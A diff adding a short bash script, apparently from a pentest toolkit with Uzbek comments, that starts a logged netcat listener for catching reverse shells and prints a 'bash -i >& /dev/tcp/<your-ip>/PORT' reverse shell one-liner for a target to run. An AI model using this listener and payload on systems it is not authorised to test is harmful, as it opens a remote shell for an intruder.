@@ -1,0 +1,42 @@
+#!/bin/bash
+# hn-listen — Quick netcat listener with logging
+# Foydalanish: hn-listen <port>
+
+PORT="${1:-4444}"
+LOG_DIR="$HOME/Pentest/Loot"
+mkdir -p "$LOG_DIR"
+LOG="$LOG_DIR/listener_$(date +%Y%m%d_%H%M%S)_${PORT}.log"
+
+GREEN='\033[0;32m'
+RED='\033[0;31m'
+CYAN='\033[0;36m'
+NC='\033[0m'
+
+echo ""
+echo -e "${CYAN}╔════════════════════════════════════════════════╗${NC}"
+echo -e "${CYAN}║${NC}    HACKNOW LISTENER — Port ${RED}$PORT${NC}                ${CYAN}║${NC}"
+echo -e "${CYAN}╠════════════════════════════════════════════════╣${NC}"
+LOCAL_IP=$(ip -4 -o addr show 2>/dev/null | awk '$2 != "lo" {print $4}' | cut -d/ -f1 | head -1)
+[ -z "$LOCAL_IP" ] && LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
+echo -e "${CYAN}║${NC} Local IP:  ${GREEN}${LOCAL_IP:-N/A}${NC}              ${CYAN}║${NC}"
+# Public IP faqat --public flag bilan ko'rsatiladi (privacy uchun)
+if [ "$2" = "--public" ] || [ "$1" = "--public" ]; then
+    PUB_IP=$(curl -s --max-time 3 ifconfig.me 2>/dev/null || echo 'N/A')
+    echo -e "${CYAN}║${NC} Public IP: ${GREEN}${PUB_IP}${NC}        ${CYAN}║${NC}"
+fi
+echo -e "${CYAN}║${NC} Log:       ${GREEN}$LOG${NC}"
+echo -e "${CYAN}╠════════════════════════════════════════════════╣${NC}"
+echo -e "${CYAN}║${NC} Reverse shell example:                          ${CYAN}║${NC}"
+echo -e "${CYAN}║${NC}  ${RED}bash -i >& /dev/tcp/<your-ip>/$PORT 0>&1${NC}     ${CYAN}║${NC}"
+echo -e "${CYAN}╚════════════════════════════════════════════════╝${NC}"
+echo ""
+
+# nc bilan listen + log
+if command -v ncat >/dev/null 2>&1; then
+    ncat -lvnp "$PORT" 2>&1 | tee "$LOG"
+elif command -v nc >/dev/null 2>&1; then
+    nc -lvnp "$PORT" 2>&1 | tee "$LOG"
+else
+    echo "❌ nc/ncat topilmadi"
+    exit 1
+fi
